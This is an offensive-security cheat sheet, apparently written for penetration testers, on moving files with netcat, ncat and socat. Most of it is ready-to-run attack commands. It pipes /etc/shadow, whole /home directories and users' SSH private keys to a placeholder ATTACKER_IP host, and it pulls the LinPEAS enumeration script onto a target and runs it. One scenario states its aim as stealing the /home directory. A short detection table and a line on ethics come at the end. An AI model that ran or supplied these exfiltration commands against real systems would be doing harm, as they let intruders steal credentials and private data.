# 🔌 Netcat & Socat File Transfer — Raw Network Transfers

## 📖 What Are Netcat and Socat?

**Netcat (nc)** is the "Swiss Army Knife" of networking — it can create **raw TCP/UDP connections** for file transfer, reverse shells, port scanning, and more.

**Socat** is Netcat's more powerful cousin — same concept but with encryption support of SSL/TLS and more features.

> When HTTP, SMB, FTP, and SSH are all blocked or unavailable, **Netcat is often your last resort** for file transfer.

```text
  SENDER                                   RECEIVER
  ┌──────────────┐   Raw TCP Connection   ┌──────────────┐
  │              │ ──────────────────────▶│              │
  │  nc (send)   │   File bytes flow      │  nc (listen) │
  │              │   No protocol overhead │              │
  │  "Push mode" │   No encryption       │  Saves file  │
  │              │   No authentication   │              │
  └──────────────┘                        └──────────────┘
```

---

## 🧠 When to Use Netcat Transfer

| Use When | Why |
| --- | --- |
| HTTP is blocked | Firewall blocks port 80/443 |
| No wget/curl on target | Minimal Linux install |
| FTP/SMB not available | Ports 21/445 blocked |
| Quick one-time transfer | No setup needed |
| Reverse file transfer | Target pushes file to you |

---

# 🐱 Netcat (nc) File Transfers

---

## Method 1: Receiver Listens, Sender Connects

### Send File: Attacker → Target

```text
  ATTACKER (Sender)              TARGET (Receiver)
  ┌──────────────┐              ┌──────────────┐
  │  Has the     │  ──────────▶ │  Listens on  │
  │  file to     │  nc connects │  port 4444   │
  │  send        │  sends bytes │  saves file  │
  └──────────────┘              └──────────────┘
```

**Step 1 — Target (Receiver) listens:**

```bash
# Target starts listening and will save received data to file
nc -nlvp 4444 > /tmp/linpeas.sh
```

**Step 2 — Attacker (Sender) sends:**

```bash
# Attacker sends the file
nc TARGET_IP 4444 < linpeas.sh
```

---

### Send File: Target → Attacker (Exfiltration)

```text
  TARGET (Sender)                ATTACKER (Receiver)
  ┌──────────────┐              ┌──────────────┐
  │  Has data    │  ──────────▶ │  Listens on  │
  │  to exfil    │  nc connects │  port 9001   │
  │  /etc/shadow │  sends bytes │  saves file  │
  └──────────────┘              └──────────────┘
```

**Step 1 — Attacker (Receiver) listens:**

```bash
nc -nlvp 9001 > shadow.txt
```

**Step 2 — Target (Sender) sends:**

```bash
cat /etc/shadow | nc ATTACKER_IP 9001
# OR
nc ATTACKER_IP 9001 < /etc/shadow
```

---

## Method 2: Sender Listens, Receiver Connects

This is the **reverse** — useful when the target can't accept incoming connections (firewall).

**Step 1 — Attacker (Sender) listens and serves the file:**

```bash
# Attacker hosts the file on a port
nc -nlvp 4444 < linpeas.sh
```

**Step 2 — Target (Receiver) connects and downloads:**

```bash
# Target connects and receives
nc ATTACKER_IP 4444 > /tmp/linpeas.sh
```

---

## Method 3: Netcat on Windows

Windows doesn't have `nc` by default, but you can:

### Option A: Upload nc.exe First

```cmd
:: If you already got nc.exe on target
nc.exe ATTACKER_IP 4444 > C:\Temp\tool.exe
```

### Option B: PowerShell Netcat Alternative (Ncat, pwncat)

```powershell
# Use PowerShell as a basic netcat
$client = New-Object System.Net.Sockets.TcpClient("ATTACKER_IP", 4444)
$stream = $client.GetStream()
$file = [System.IO.File]::Create("C:\Temp\tool.exe")
$stream.CopyTo($file)
$file.Close()
$client.Close()
```

---

## Method 4: Ncat (Nmap's Netcat — Better!)

**Ncat** is Netcat from Nmap project — supports **SSL encryption**.

### Transfer with Encryption

**Receiver (with SSL):**

```bash
ncat --recv-only -nlvp 4444 --ssl > received_file
```

**Sender (with SSL):**

```bash
ncat --send-only TARGET_IP 4444 --ssl < secret_file.zip
```

---

## Transfer Binary Files Safely

> ⚠ **Important**: When transferring binary files (.exe, .zip), make sure the transfer is complete before closing the connection.

### Method: Using md5sum to Verify

**Sender:**

```bash
# Check hash before sending
md5sum tool.exe
# Output: a1b2c3d4e5f6... tool.exe

# Send
nc -nlvp 4444 < tool.exe
```

**Receiver:**

```bash
# Receive
nc SENDER_IP 4444 > tool.exe

# Verify hash matches
md5sum tool.exe
# Should match: a1b2c3d4e5f6...
```

---

# 🔗 Socat File Transfers

**Socat** is more powerful and supports encryption natively.

---

## Basic Socat Transfer

### Send File: Attacker → Target

**Attacker (Server — serves the file):**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork FILE:linpeas.sh
```

**Target (Client — downloads):**

```bash
socat TCP:ATTACKER_IP:4444 FILE:/tmp/linpeas.sh,create
```

---

### Send File: Target → Attacker

**Attacker (Server — receives):**

```bash
socat TCP-LISTEN:9001,reuseaddr FILE:received.txt,create
```

**Target (Client — sends):**

```bash
socat FILE:/etc/shadow TCP:ATTACKER_IP:9001
```

---

## Socat with SSL Encryption

**Generate SSL certificate:**

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
cat key.pem cert.pem > combined.pem
```

**Sender (with SSL):**

```bash
socat OPENSSL-LISTEN:4444,cert=combined.pem,verify=0,reuseaddr,fork FILE:secret.zip
```

**Receiver (with SSL):**

```bash
socat OPENSSL:ATTACKER_IP:4444,verify=0 FILE:/tmp/secret.zip,create
```

---

## 🔥 Realistic Scenarios

---

### Scenario 1: Only Netcat Available on Target

```text
SITUATION: Minimal Linux container — only bash and netcat

ATTACKER:
┌──────────────────────────────────────────┐
│ # Serve LinPEAS                          │
│ nc -nlvp 4444 < linpeas.sh              │
└──────────────────────────────────────────┘

TARGET:
┌──────────────────────────────────────────┐
│ # Download                               │
│ nc 10.10.14.5 4444 > /tmp/linpeas.sh    │
│ chmod +x /tmp/linpeas.sh                │
│ /tmp/linpeas.sh                          │
└──────────────────────────────────────────┘
```

---

### Scenario 2: Exfiltrate a Directory

```text
SITUATION: Need to steal entire /home directory

ATTACKER (Listen):
┌──────────────────────────────────────────┐
│ nc -nlvp 9001 > home_backup.tar.gz       │
└──────────────────────────────────────────┘

TARGET (Compress and Send):
┌──────────────────────────────────────────┐
│ tar czf - /home | nc ATTACKER_IP 9001    │
│                                          │
│ # tar creates archive, pipes to nc       │
│ # nc sends it to attacker                │
└──────────────────────────────────────────┘

ATTACKER (Extract):
┌──────────────────────────────────────────┐
│ tar xzf home_backup.tar.gz              │
│ ls home/                                 │
└──────────────────────────────────────────┘
```

---

### Scenario 3: Multiple Files via tar + nc

```bash
# Attacker (receive):
nc -nlvp 4444 > loot.tar

# Target (send multiple files):
tar cf - /etc/passwd /etc/shadow /home/*/.ssh/id_rsa 2>/dev/null | nc ATTACKER_IP 4444
```

---

## 📊 Netcat vs Socat Comparison

| Feature | Netcat (nc) | Socat |
| --- | --- | --- |
| Availability | Very common | Less common |
| SSL/TLS | ❌ (ncat has it) | ✅ Built-in |
| Ease of use | ⭐ Very easy | ⭐⭐ Medium |
| Bi-directional | ✅ | ✅ |
| Fork (multi-client) | ❌ | ✅ |
| IPv6 support | ⚠ Some versions | ✅ |

---

## 📊 Netcat Flags Quick Reference

| Flag | Meaning |
| --- | --- |
| `-n` | No DNS resolution |
| `-l` | Listen mode |
| `-v` | Verbose |
| `-p PORT` | Specify port |
| `-w SECS` | Timeout |
| `-q SECS` | Quit after EOF |
| `-e PROG` | Execute program on connect |
| `< file` | Send file contents |
| `> file` | Save received data |

---

## 🛡 Blue Team — Detection

| Indicator | What to Monitor |
| --- | --- |
| nc / ncat processes | Unusual netcat execution |
| Raw TCP on unusual ports | Connections on 4444, 9001, etc. |
| Large data transfers | Unexpected data volume on non-standard ports |
| socat processes | Look for socat with file redirection |

---

## ⚠ Ethical Reminder

* ✅ Only use on systems with **written authorization**
* ✅ Practice in your own lab
* ❌ Never exfiltrate real data without permission
